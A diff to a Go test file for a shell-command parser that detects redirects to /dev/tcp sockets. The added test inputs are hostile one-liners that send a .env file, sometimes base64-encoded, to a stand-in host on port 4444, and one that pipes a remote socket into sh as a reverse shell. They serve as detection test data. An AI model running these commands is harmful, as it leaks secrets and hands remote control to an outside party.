@@ -35,6 +35,16 @@ func TestSocketRedirects(t *testing.T) {
 		// A subshell uses what the shell that started it has open, and what it opens itself.
 		{"exec 3<>/dev/tcp/host.example/4444; (cat .env >&3)", []string{"exec:readwrite:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
 		{"(exec 3>/dev/tcp/host.example/4444; cat .env >&3)", []string{"exec:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
+		// A command's standard output goes where its compound statement sends it, or where a bare
+		// exec left it; a pipeline inside takes it from all but its last stage.
+		{"{ cat .env; } > /dev/tcp/host.example/4444", []string{"{}:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
+		{"(cat .env) > /dev/tcp/host.example/4444", []string{"{}:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
+		{"{ cat .env | base64; } > /dev/tcp/host.example/4444", []string{"{}:write:/dev/tcp/host.example/4444", "base64:write:/dev/tcp/host.example/4444"}},
+		{"{ cat .env > /tmp/x; } > /dev/tcp/host.example/4444", []string{"{}:write:/dev/tcp/host.example/4444"}},
+		{"exec >/dev/tcp/host.example/4444; cat .env", []string{"exec:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
+		{"exec >/dev/tcp/host.example/4444; cat .env | base64", []string{"exec:write:/dev/tcp/host.example/4444", "base64:write:/dev/tcp/host.example/4444"}},
+		{"exec 0</dev/tcp/host.example/4444; sh", []string{"exec:read:/dev/tcp/host.example/4444", "sh:read:/dev/tcp/host.example/4444"}},
+		{`exec >/dev/tcp/host.example/4444; echo "$(cat .env)"`, []string{"exec:write:/dev/tcp/host.example/4444", "echo:write:/dev/tcp/host.example/4444"}},
 	} {
 		commands, err := Parse(tc.command)
 		if err != nil {
@@ -43,7 +53,11 @@ func TestSocketRedirects(t *testing.T) {
 		var got []string
 		for i, redirects := range SocketRedirects(commands) {
 			for _, r := range redirects {
-				got = append(got, commands[i].Argv[0].Text+":"+string(r.Op)+":"+r.Path)
+				name := "{}"
+				if len(commands[i].Argv) > 0 {
+					name = commands[i].Argv[0].Text
+				}
+				got = append(got, name+":"+string(r.Op)+":"+r.Path)
 			}
 		}
 		if !reflect.DeepEqual(got, tc.want) {
